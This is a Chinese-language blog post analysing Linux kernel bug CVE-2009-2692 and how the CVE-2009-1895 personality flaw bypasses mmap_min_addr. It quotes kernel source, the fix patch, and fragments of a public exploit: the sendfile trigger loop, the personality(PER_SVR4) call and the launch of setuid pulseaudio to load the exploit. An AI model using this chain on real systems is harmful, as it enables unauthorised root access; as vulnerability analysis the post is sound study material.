<!doctype html>




<html class="theme-next pisces">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />












  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.0.2" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="privilege escalation,bypass mmap_min_addr," />








  <link rel="shortcut icon" type="image/x-icon" href="/images/w0lfzhang.ico?v=5.0.2" />






<meta name="description" content="首先看一下这个漏洞的简要描述：The Linux kernel 2.6.0 through 2.6.30.4, and 2.4.4 through 2.4.37.4, does not initialize all function pointers for socket operations in proto_ops structures, which allows local users to">
<meta name="keywords" content="privilege escalation,bypass mmap_min_addr">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2009-2692: How to Bypass mmap_min_addr">
<meta property="og:url" content="http://yoursite.com/2017/09/26/CVE-2009-2692-How-to-Bypass-mmap-min-addr/index.html">
<meta property="og:site_name" content="w0lfzhang&#39;s blog">
<meta property="og:description" content="首先看一下这个漏洞的简要描述：The Linux kernel 2.6.0 through 2.6.30.4, and 2.4.4 through 2.4.37.4, does not initialize all function pointers for socket operations in proto_ops structures, which allows local users to">
<meta property="og:updated_time" content="2017-11-16T13:43:33.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CVE-2009-2692: How to Bypass mmap_min_addr">
<meta name="twitter:description" content="首先看一下这个漏洞的简要描述：The Linux kernel 2.6.0 through 2.6.30.4, and 2.4.4 through 2.4.37.4, does not initialize all function pointers for socket operations in proto_ops structures, which allows local users to">



<script type="text/javascript" id="hexo.configuration">
  var NexT = window.NexT || {};
  var CONFIG = {
    scheme: 'Pisces',
    sidebar: {"position":"left","display":"always"},
    fancybox: true,
    motion: false,
    duoshuo: {
      userId: '0',
      author: 'Author'
    }
  };
</script>




  <link rel="canonical" href="http://yoursite.com/2017/09/26/CVE-2009-2692-How-to-Bypass-mmap-min-addr/"/>


  <title> CVE-2009-2692: How to Bypass mmap_min_addr | w0lfzhang's blog </title>
</head>

<body itemscope itemtype="//schema.org/WebPage" lang="en">

  


<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-86514506-1', 'auto');
  ga('send', 'pageview');
</script>


  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?c3be9cb478c70b5f3b819ddd0ba381b6";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>








  
  
    
  

  <div class="container one-collumn sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="//schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/"  class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">w0lfzhang's blog</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
  <p class="site-subtitle">pwn, pwn, pwn!!!</p>
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
            About
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
            Tags
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
            Search
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup">
 <span class="search-icon fa fa-search"></span>
 <input type="text" id="local-search-input">
 <div id="local-search-result"></div>
 <span class="popup-btn-close">close</span>
</div>


    </div>
  
</nav>

 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                CVE-2009-2692: How to Bypass mmap_min_addr
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">Posted on</span>
            <time itemprop="dateCreated" datetime="2017-09-26T15:19:30+08:00" content="2017-09-26">
              2017-09-26
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/cve-analysis/" itemprop="url" rel="index">
                    <span itemprop="name">cve_analysis</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
                &nbsp; | &nbsp;
                <a href="/2017/09/26/CVE-2009-2692-How-to-Bypass-mmap-min-addr/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2017/09/26/CVE-2009-2692-How-to-Bypass-mmap-min-addr/" itemprop="commentsCount"></span>
                </a>
              </span>
            
          

          
	 

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>首先看一下这个漏洞的简要描述：<br>The Linux kernel 2.6.0 through 2.6.30.4, and 2.4.4 through 2.4.37.4, does not initialize all function pointers for socket operations in proto_ops structures, which allows local users to trigger a NULL pointer dereference and gain privileges by using mmap to map page zero, placing arbitrary code on this page, and then invoking an unavailable operation, as demonstrated by the sendpage operation (sock_sendpage function) on a PF_PPPOX socket.<br><a id="more"></a><br>说来也很简单，就是由于socket结构体的proto_ops字段里的有些函数指针没有初始化可以导致NULL pointer dereference。虽然这种漏洞提权很简单，但是前提是可以mmap page zero！但是linux大部分情况下是设置mmap_min_addr大于等于65536的，所以在实际漏洞利用中我们一般是无法mmap page zero的，除非绕过这个限制！这就是我为什么要花点时间研究一下这个漏洞的原因——因为exp中介绍了一种可以bypass NULL pointer dereference防御的方法！</p>
<h2 id="cve-2009-2692-analysis"><a href="#cve-2009-2692-analysis" class="headerlink" title="cve-2009-2692 analysis"></a>cve-2009-2692 analysis</h2><p>首先还是简单分析一下这个漏洞的成因。前面的描述居然不说漏洞在哪个函数~害得我找了老半天没找着，最后还是在另外一个地方找到了稍微详细点的描述：<br>Description of problem:<br>Reported by Tavis Ormandy and Julien Tinnes. The SOCKOPS_WRAP macro from include/linux/net.h doesn’t initialise the sendpage operation in the proto_ops structure correctly. Leading to a kernel NULL pointer dereference, and thus a local privilege escalation.<br>看下SOCKOPS_WRAP到底是怎么初始化proto_ops的：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> SOCKOPS_WRAP(name, fam)					\</span></div><div class="line">SOCKCALL_WRAP(name, release, (struct socket *sock), (sock))	\</div><div class="line">SOCKCALL_WRAP(name, bind, (struct socket *sock, struct sockaddr *uaddr, int addr_len), \</div><div class="line">	      (sock, uaddr, addr_len))				\</div><div class="line">SOCKCALL_WRAP(name, connect, (struct socket *sock, struct sockaddr * uaddr, \</div><div class="line">			      int addr_len, int flags), 	\</div><div class="line">	      (sock, uaddr, addr_len, flags))			\</div><div class="line">SOCKCALL_WRAP(name, socketpair, (struct socket *sock1, struct socket *sock2), \</div><div class="line">	      (sock1, sock2))					\</div><div class="line">SOCKCALL_WRAP(name, accept, (struct socket *sock, struct socket *newsock, \</div><div class="line">			 int flags), (sock, newsock, flags)) \</div><div class="line">SOCKCALL_WRAP(name, getname, (struct socket *sock, struct sockaddr *uaddr, \</div><div class="line">			 int *addr_len, int peer), (sock, uaddr, addr_len, peer)) \</div><div class="line">SOCKCALL_UWRAP(name, poll, (struct file *file, struct socket *sock, struct poll_table_struct *wait), \</div><div class="line">	      (file, sock, wait)) \</div><div class="line">SOCKCALL_WRAP(name, ioctl, (struct socket *sock, unsigned int cmd, \</div><div class="line">			 unsigned long arg), (sock, cmd, arg)) \</div><div class="line">SOCKCALL_WRAP(name, compat_ioctl, (struct socket *sock, unsigned int cmd, \</div><div class="line">			 unsigned long arg), (sock, cmd, arg)) \</div><div class="line">SOCKCALL_WRAP(name, listen, (struct socket *sock, int len), (sock, len)) \</div><div class="line">SOCKCALL_WRAP(name, shutdown, (struct socket *sock, int flags), (sock, flags)) \</div><div class="line">SOCKCALL_WRAP(name, setsockopt, (struct socket *sock, int level, int optname, \</div><div class="line">			 char __user *optval, int optlen), (sock, level, optname, optval, optlen)) \</div><div class="line">SOCKCALL_WRAP(name, getsockopt, (struct socket *sock, int level, int optname, \</div><div class="line">			 char __user *optval, int __user *optlen), (sock, level, optname, optval, optlen)) \</div><div class="line">SOCKCALL_WRAP(name, sendmsg, (struct kiocb *iocb, struct socket *sock, struct msghdr *m, size_t len), \</div><div class="line">	      (iocb, sock, m, len)) \</div><div class="line">SOCKCALL_WRAP(name, recvmsg, (struct kiocb *iocb, struct socket *sock, struct msghdr *m, size_t len, int flags), \</div><div class="line">	      (iocb, sock, m, len, flags)) \</div><div class="line">SOCKCALL_WRAP(name, mmap, (struct file *file, struct socket *sock, struct vm_area_struct *vma), \</div><div class="line">	      (file, sock, vma)) \</div><div class="line">	      \</div><div class="line">static const struct proto_ops name##_ops = &#123;			\</div><div class="line">	.family		= fam,				\</div><div class="line">	.owner		= THIS_MODULE,			\</div><div class="line">	.release	= __lock_##name##_release,	\</div><div class="line">	.bind		= __lock_##name##_bind,		\</div><div class="line">	.connect	= __lock_##name##_connect,	\</div><div class="line">	.socketpair	= __lock_##name##_socketpair,	\</div><div class="line">	.accept		= __lock_##name##_accept,	\</div><div class="line">	.getname	= __lock_##name##_getname,	\</div><div class="line">	.poll		= __lock_##name##_poll,		\</div><div class="line">	.ioctl		= __lock_##name##_ioctl,	\</div><div class="line">	.compat_ioctl	= __lock_##name##_compat_ioctl,	\</div><div class="line">	.listen		= __lock_##name##_listen,	\</div><div class="line">	.shutdown	= __lock_##name##_shutdown,	\</div><div class="line">	.setsockopt	= __lock_##name##_setsockopt,	\</div><div class="line">	.getsockopt	= __lock_##name##_getsockopt,	\</div><div class="line">	.sendmsg	= __lock_##name##_sendmsg,	\</div><div class="line">	.recvmsg	= __lock_##name##_recvmsg,	\</div><div class="line">	.mmap		= __lock_##name##_mmap,		\</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>proto_ops最后一个函数指针sendpage没有初始化，从而在调用sock_sendpage是会导致NULL pointer dereference。受影响的protocol有很多，不只是上面提到的PF_PPPOX。可以这样看哪些protocol受到了影响：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">repeat_it:</div><div class="line">		<span class="keyword">for</span> (; domains[d][<span class="number">0</span>] != DOMAINS_STOP; d++) &#123;</div><div class="line">			<span class="keyword">if</span> ((out = socket(domains[d][<span class="number">0</span>], domains[d][<span class="number">1</span>], domains[d][<span class="number">2</span>])) &gt;= <span class="number">0</span>)</div><div class="line">				<span class="keyword">break</span>;</div><div class="line">		&#125;</div><div class="line">    </div><div class="line">		<span class="keyword">if</span> (out &lt; <span class="number">0</span>) &#123;</div><div class="line">			<span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">"unable to find a vulnerable domain, sorry\n"</span>);</div><div class="line">			<span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="comment">// Truncate input file to some large value</span></div><div class="line">		ftruncate(in, getpagesize());</div><div class="line"></div><div class="line">		<span class="comment">// sendfile() to trigger the bug.</span></div><div class="line">		sendfile(out, in, <span class="literal">NULL</span>, getpagesize());</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (got_ring0) &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"target domain: %d\n"</span>, d);</div><div class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">" [+] got ring0!\n"</span>);</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		d++;</div><div class="line">		<span class="keyword">goto</span> repeat_it;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
<p>具体exp请参考<a href="https://github.com/SecWiki/linux-kernel-exploits/tree/master/2009/CVE-2009-2692" target="_blank" rel="external">这里</a>。</p>
<h2 id="Bypass-mmap-min-addr-protection"><a href="#Bypass-mmap-min-addr-protection" class="headerlink" title="Bypass mmap_min_addr protection"></a>Bypass mmap_min_addr protection</h2><p>现在关键是怎么bypass mmap_min_addr protection。<br>这就需要利用到另外一个漏洞——CVE-2009-1895。看下这个漏洞的描述：<br>The personality subsystem in the Linux kernel before 2.6.31-rc3 has a PER_CLEAR_ON_SETID setting that does not clear the ADDR_COMPAT_LAYOUT and MMAP_PAGE_ZERO flags when executing a setuid or setgid program, which makes it easier for local users to leverage the details of memory usage to (1) conduct NULL pointer dereference attacks, (2) bypass the mmap_min_addr protection mechanism, or (3) defeat address space layout randomization (ASLR).<br>分析一下源码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line"> * Flags for bug emulation.</div><div class="line"> *</div><div class="line"> * These occupy the top three bytes.</div><div class="line"> */</div><div class="line"><span class="keyword">enum</span> &#123;</div><div class="line">       ADDR_NO_RANDOMIZE =     <span class="number">0x0040000</span>,      <span class="comment">/* disable randomization of VA space */</span></div><div class="line">       FDPIC_FUNCPTRS =        <span class="number">0x0080000</span>,      <span class="comment">/* userspace function ptrs point to descriptors</span></div><div class="line">                                                * (signal handling)</div><div class="line">                                                */</div><div class="line">       MMAP_PAGE_ZERO =        <span class="number">0x0100000</span>,</div><div class="line">       ADDR_COMPAT_LAYOUT =    <span class="number">0x0200000</span>,</div><div class="line">       READ_IMPLIES_EXEC =     <span class="number">0x0400000</span>,</div><div class="line">       ADDR_LIMIT_32BIT =      <span class="number">0x0800000</span>,</div><div class="line">       SHORT_INODE =           <span class="number">0x1000000</span>,</div><div class="line">       WHOLE_SECONDS =         <span class="number">0x2000000</span>,</div><div class="line">       STICKY_TIMEOUTS =       <span class="number">0x4000000</span>,</div><div class="line">       ADDR_LIMIT_3GB =        <span class="number">0x8000000</span>,</div><div class="line">&#125;;</div><div class="line"> </div><div class="line"><span class="comment">/*</span></div><div class="line"> * Security-relevant compatibility flags that must be</div><div class="line"> * cleared upon setuid or setgid exec:</div><div class="line"> */</div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PER_CLEAR_ON_SETID (READ_IMPLIES_EXEC|ADDR_NO_RANDOMIZE)</span></div></pre></td></tr></table></figure></p>
<p>所以我们只需要找到一个setuid的program可以执行我们的exp就能绕过mmap_min_addr protection。<br>首先用personality系统调用设置persona：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ret = personality(PER_SVR4);</div><div class="line"></div><div class="line"><span class="comment">//PER_SVR4 = 0x0001 | STICKY_TIMEOUTS | MMAP_PAGE_ZERO</span></div><div class="line"><span class="comment">//PER_SVR4 = 0x4100001</span></div></pre></td></tr></table></figure></p>
<p>然后suid program会clear PER_CLEAR_ON_SETID，但是MMAP_PAGE_ZERO并没有clear，所以程序此时可以mmap page zero。然后就是布置payload即可。<br>很辛运的是在大部分linux中都有这样一个setuid的program：pulseaudio，而且可以通过他的-L选项来执行我们的exp。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">execl(PULSEAUDIO_PATH, PULSEAUDIO_PATH, <span class="string">"--log-level=0"</span>, <span class="string">"-L"</span>, PATH_TO_EXPLOIT, <span class="literal">NULL</span>);</div></pre></td></tr></table></figure></p>
<p>现在的话这个漏洞基本已经被修复了。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PER_CLEAR_ON_SETID (READ_IMPLIES_EXEC|ADDR_NO_RANDOMIZE|ADDR_COMPAT_LAYOUT|MMAP_PAGE_ZERO)</span></div></pre></td></tr></table></figure></p>
<p>所以现在还有什么措施能绕过NULL pointer dereference protection？</p>
<h2 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">diff --git a/net/socket.c b/net/socket.c</div><div class="line">index 791d71a..6d47165 100644</div><div class="line">--- a/net/socket.c</div><div class="line">+++ b/net/socket.c</div><div class="line">@@ -736,7 +736,7 @@ static ssize_t sock_sendpage(struct file *file, struct page *page,</div><div class="line"> 	if (more)</div><div class="line"> 		flags |= MSG_MORE;</div><div class="line"> </div><div class="line">-	return sock-&gt;ops-&gt;sendpage(sock, page, offset, size, flags);</div><div class="line">+	return kernel_sendpage(sock, page, offset, size, flags);</div><div class="line"> &#125;</div></pre></td></tr></table></figure>
<h2 id="Links"><a href="#Links" class="headerlink" title="Links"></a>Links</h2><p><a href="https://bugzilla.redhat.com/show_bug.cgi?id=516949" target="_blank" rel="external">Bug 516949 - (CVE-2009-2692) CVE-2009-2692 kernel: uninit op in SOCKOPS_WRAP() leads to privesc</a><br><a href="http://webcache.googleusercontent.com/search?q=cache:http://blog.cr0.org/2009/06/bypassing-linux-null-pointer.html" target="_blank" rel="external">Bypassing Linux’ NULL pointer dereference exploit prevention (mmap_min_addr)</a><br><a href="https://xorl.wordpress.com/2009/07/16/cve-2009-1895-linux-kernel-per_clear_on_setid-personality-bypass/" target="_blank" rel="external">CVE-2009-1895: Linux kernel PER_CLEAR_ON_SETID Personality Bypass</a><br><a href="https://access.redhat.com/security/cve/cve-2009-1895" target="_blank" rel="external">CVE-2009-1895</a><br><a href="http://man7.org/linux/man-pages/man2/personality.2.html" target="_blank" rel="external">PERSONALITY(2) </a></p>

      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        

      
    </div>

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/privilege-escalation/" rel="tag">#privilege escalation</a>
          
            <a href="/tags/bypass-mmap-min-addr/" rel="tag">#bypass mmap_min_addr</a>
          
        </div>
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2017/09/24/CVE-2008-0600-vmsplice-Privilege-Escalation/" rel="next" title="CVE-2008-0600: vmsplice() Privilege Escalation">
                <i class="fa fa-chevron-left"></i> CVE-2008-0600: vmsplice() Privilege Escalation
              </a>
            
          </div>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2017/09/28/CVE-2010-3301-ia32syscall-Emulation-Privilege-Escalation/" rel="prev" title="CVE-2010-3301: ia32syscall Emulation Privilege Escalation">
                CVE-2010-3301: ia32syscall Emulation Privilege Escalation <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          
  <div class="comments" id="comments">
    
      <div id="disqus_thread">
        <noscript>
          Please enable JavaScript to view the
          <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
        </noscript>
      </div>
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            Overview
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel ">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="//schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/images/wolf.jpg"
               alt="w0lfzhang" />
          <p class="site-author-name" itemprop="name">w0lfzhang</p>
          <p class="site-description motion-element" itemprop="description">Go slowly! Just slowly!</p>
        </div>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">59</span>
              <span class="site-state-item-name">posts</span>
            </a>
          </div>

          
            <div class="site-state-item site-state-categories">
              <a href="/categories">
                <span class="site-state-item-count">15</span>
                <span class="site-state-item-name">categories</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-tags">
              <a href="/tags">
                <span class="site-state-item-count">97</span>
                <span class="site-state-item-name">tags</span>
              </a>
            </div>
          

        </nav>

        

        <div class="links-of-author motion-element">
          
        </div>

        
        

        
        

      </section>

      
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">
            
              
            
            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#cve-2009-2692-analysis"><span class="nav-number">1.</span> <span class="nav-text">cve-2009-2692 analysis</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Bypass-mmap-min-addr-protection"><span class="nav-number">2.</span> <span class="nav-text">Bypass mmap_min_addr protection</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Patch"><span class="nav-number">3.</span> <span class="nav-text">Patch</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Links"><span class="nav-number">4.</span> <span class="nav-text">Links</span></a></li></ol></div>
            
          </div>
        </section>
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

<div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">w0lfzhang</span>
</div>

<div class="powered-by">
  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
</div>

<div class="theme-info">
  Theme -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Pisces
  </a>
</div>

<span id="busuanzi_container_site_pv">
    &nbsp; | &nbsp;Visited <span id="busuanzi_value_site_pv"></span> times
</span>



        

        
      </div>
    </footer>

    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
    </div>
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  



  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.0.2"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.0.2"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.0.2"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.2"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.2"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.0.2"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.2"></script>



  



  

    <script type="text/javascript">
      var disqus_shortname = 'w0lfzhang';
      var disqus_identifier = '2017/09/26/CVE-2009-2692-How-to-Bypass-mmap-min-addr/';
      var disqus_title = "CVE-2009-2692: How to Bypass mmap_min_addr";
      var disqus_url = 'http://yoursite.com/2017/09/26/CVE-2009-2692-How-to-Bypass-mmap-min-addr/';

      function run_disqus_script(disqus_script){
        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
      }

      run_disqus_script('count.js');
      
        var disqus_config = function () {
            this.page.url = disqus_url;
            this.page.identifier = disqus_identifier;
            this.page.title = disqus_title;
        };
        run_disqus_script('embed.js');
      
    </script>
  




  
  
  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length == 0) {
       search_path = "search.xml";
    }
    var path = "/" + search_path;
    // monitor main search box;

    function proceedsearch() {
      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
      $('.popup').toggle();

    }
    // search function;
    var searchFunc = function(path, search_id, content_id) {
    'use strict';
    $.ajax({
        url: path,
        dataType: "xml",
        async: true,
        success: function( xmlResponse ) {
            // get the contents from search data
            isfetched = true;
            $('.popup').detach().appendTo('.header-inner');
            var datas = $( "entry", xmlResponse ).map(function() {
                return {
                    title: $( "title", this ).text(),
                    content: $("content",this).text(),
                    url: $( "url" , this).text()
                };
            }).get();
            var $input = document.getElementById(search_id);
            var $resultContent = document.getElementById(content_id);
            $input.addEventListener('input', function(){
                var matchcounts = 0;
                var str='<ul class=\"search-result-list\">';
                var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                $resultContent.innerHTML = "";
                if (this.value.trim().length > 1) {
                // perform local searching
                datas.forEach(function(data) {
                    var isMatch = false;
                    var content_index = [];
                    var data_title = data.title.trim().toLowerCase();
                    var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
                    var data_url = decodeURIComponent(data.url);
                    var index_title = -1;
                    var index_content = -1;
                    var first_occur = -1;
                    // only match artiles with not empty titles and contents
                    if(data_title != '') {
                        keywords.forEach(function(keyword, i) {
                            index_title = data_title.indexOf(keyword);
                            index_content = data_content.indexOf(keyword);
                            if( index_title >= 0 || index_content >= 0 ){
                                isMatch = true;
								if (i == 0) {
                                    first_occur = index_content;
                                }
                            } 
							
                        });
                    }
                    // show search results
                    if (isMatch) {
                        matchcounts += 1;
                        str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
                        var content = data.content.trim().replace(/<[^>]+>/g,"");
                        if (first_occur >= 0) {
                            // cut out 100 characters
                            var start = first_occur - 20;
                            var end = first_occur + 80;
                            if(start < 0){
                                start = 0;
